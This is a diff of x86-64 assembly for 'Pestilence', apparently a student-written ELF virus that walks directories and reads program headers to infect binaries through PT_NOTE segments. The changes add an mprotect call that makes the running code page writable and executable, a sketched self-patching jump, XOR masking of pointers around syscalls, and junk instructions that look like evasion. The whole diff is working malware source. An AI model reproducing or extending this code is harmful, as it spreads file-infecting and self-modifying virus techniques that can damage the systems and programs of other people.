@@ -5,6 +5,7 @@
 %define SYS_STAT		4
 %define SYS_FSTAT		5
 %define SYS_LSEEK		8
+%define SYS_MPROTECT	10
 %define SYS_PREAD64		17
 %define SYS_PWRITE64	18
 %define SYS_EXIT		60
@@ -20,8 +21,8 @@
 %define SEEK_END	2
 
 %define PESTILENCE_STACK_SIZE 5000
-%define DIRENT_BUFFSIZE 1024
-
+%define DIRENT_BUFFSIZE	1024
+%define ASM_JUMP_INSTR	0xe9
 %define EHDR_SIZE 64
 %define PHDR_SIZE 56
 %define PT_NOTE	4
@@ -96,6 +97,19 @@ global _start
 
 section .text
 _start:
+	; db 0xeb, 0xff, 0xc0
+	; .mprotect:
+
+	; 	mov rdi, 4095
+	; 	not rdi
+	; 	call .get_rip
+	; 	.get_rip:
+	; 		pop rbp
+	; 	and rdi, rbp
+	; 	mov rsi, 4096
+	; 	mov rdx, 7 ; PROT_READ | PROT_WRITE | PROT_EXEC
+	; 	mov rax, SYS_MPROTECT
+	; 	syscall
 	S_IRUSR equ 256 ; Owner has read permission
 	S_IWUSR equ 128 ; Owner has write permission
 
@@ -276,8 +290,10 @@ _useless:
 
 _folder_stat:
 	mov rdi, r15
+	xor rdi, 0xfe45
 	lea rsi, [r15 + 32]
 	mov rax, SYS_STAT
+	xor rdi, 0xfe45
 	syscall
 
 	cmp rax, 0
@@ -297,17 +313,26 @@ _is_dir:
 	jne _end
 	nop
 
+_write_an_important_message:
+	mov rax, SYS_WRITE
+	mov rdi, 1
+	lea rsi, [r15]
+	mov rdx, 0
+	syscall
+
 _diropen:
 	mov rdi, 0
 	nop
 	add rdi, rdi
 	nop
 	mov rdi, r15
+	xor rdi, 0xaf34
 	nop
 	mov rsi, O_RDONLY
 	nop
 	mov rax, SYS_OPEN
 	nop
+	xor rdi, 0xaf34
 	syscall
 
 	test rax, rax                                  ; checking open
@@ -503,7 +528,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			imul rax, rax, 1
 
 			mov qword [r15 + 1492], r10           ; saving phdr offset
-
+			mov rdi, [r15 + 1420]
 			mov rax, SYS_PREAD64
 			syscall
 
@@ -659,7 +684,27 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 
 		_next_phdr:
 			inc word [r15 + 1484]
+			_mprotect:
+
+				mov rdi, 4095
+				not rdi
+				call .get_rip
+				.get_rip:
+					pop rbp
+				and rdi, rbp
+				mov rsi, 4096
+				mov rdx, 7 ; PROT_READ | PROT_WRITE | PROT_EXEC
+				mov rax, SYS_MPROTECT
+				syscall
+		; 	nop
+		_pseudo_jump:
+			; call .get_rip
+			; .get_rip:
+			; 	pop rbp
+			; mov byte [rbp + 5], 0xe9
+			nop
 			jmp _read_phdr
+		; 	nop
 
 	_close_bin:
 		mov qword rdi, [r15 + 1420]
@@ -676,7 +721,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		syscall
 
 pestilence:
-	db 'Pestilence version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Nights Watch', 0x00
+	db 'Pestilence version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Night', 0x27 ,'s Watch', 0x00
 
 _close_folder:
 	mov rdi, [r15 + 16]
@@ -684,7 +729,6 @@ _close_folder:
 	syscall
 
 _tmp_test2:
-	;mov qword [r15 + 8], 't/'
 	mov r9, [r15 + 8]
 	cmp r9w, 0x2f74
 	jne _end
